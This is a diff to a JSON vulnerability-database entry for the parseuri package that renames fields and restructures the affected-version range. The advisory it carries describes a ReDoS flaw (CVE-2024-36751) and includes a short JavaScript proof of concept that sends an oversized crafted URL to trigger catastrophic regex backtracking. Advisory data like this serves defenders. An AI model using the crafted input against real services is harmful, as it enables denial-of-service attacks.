@@ -1,9 +1,10 @@
 {
-  "name": "parseuri",
-  "lastUpdated": "2026-01-31T15:05:26.294Z",
+  "packageName": "parseuri",
+  "lastUpdated": "2026-03-08T16:40:25.784Z",
   "vulnerabilities": [
     {
       "id": "GHSA-6fx8-h7jm-663j",
+      "packageName": "parseuri",
       "title": "parse-uri Regular expression Denial of Service (ReDoS)",
       "description": "An issue in parse-uri v1.0.9 allows attackers to cause a Regular expression Denial of Service (ReDoS) via a crafted URL.\n ## PoC\n```js\nasync function exploit() {\n    const parseuri = require(\"parse-uri\");\n    // This input is designed to cause excessive backtracking in the regex\n    const craftedInput = 'http://example.com/' + 'a'.repeat(30000) + '?key=value';\n    const result = await parseuri(craftedInput);\n    }\nawait exploit();\n```",
       "severity": "medium",
@@ -20,7 +21,12 @@
           "value": "CVE-2024-36751"
         }
       ],
-      "affectedRange": "< 2.0.0"
+      "affectedVersions": [
+        {
+          "range": "< 2.0.0"
+        }
+      ],
+      "source": "github"
     }
   ]
 }
